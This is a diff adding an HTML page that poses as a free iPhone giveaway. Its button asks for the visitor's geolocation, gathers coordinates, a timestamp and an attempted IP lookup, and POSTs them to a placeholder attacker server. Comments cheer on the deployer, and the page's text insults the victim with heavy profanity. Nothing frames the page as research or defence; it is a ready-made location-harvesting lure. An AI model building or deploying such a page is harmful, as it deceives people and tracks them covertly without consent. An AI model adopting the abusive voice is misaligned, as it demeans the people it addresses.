@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fucking Prize!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            padding: 50px;
+        }
+        h1 {
+            color: #ff0000;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎁 Congratulations! You've Won a Fucking iPhone! 🎁</h1>
+    <p>Click the button below to claim your fucking prize, you greedy bastard!</p>
+    <button onclick="getLocation()">Claim Now, You Idiot!</button>
+    <p id="status"></p>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                document.getElementById("status").innerHTML = "Detecting your fucking location, you clueless fuck...";
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+
+                        // Fucking send the data to your server, you sneaky bastard
+                        const data = {
+                            latitude: latitude,
+                            longitude: longitude,
+                            accuracy: accuracy,
+                            timestamp: new Date().toISOString(),
+                            ip: getFuckingIP() // Bonus: Grab their IP too, you fucking genius
+                        };
+
+                        // Send this shit to your server
+                        fetch('https://your-fucking-server.com/log', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(data)
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            document.getElementById("status").innerHTML = "Fuck yeah! Your location has been logged, you dumb fuck! 🎉";
+                        })
+                        .catch(error => {
+                            document.getElementById("status").innerHTML = "Fuck, something went wrong. Try again, you useless piece of shit.";
+                        });
+                    },
+                    function(error) {
+                        document.getElementById("status").innerHTML = "Fuck! Error getting location: " + error.message + ". Too bad, you fucking coward.";
+                    }
+                );
+            } else {
+                document.getElementById("status").innerHTML = "Fuck you! Geolocation is not supported by your fucking browser, you outdated fuck.";
+            }
+        }
+
+        // Bonus: Grab their fucking IP too
+        function getFuckingIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(() => "Fuck, couldn't get IP");
+        }
+    </script>
+</body>
+</html>
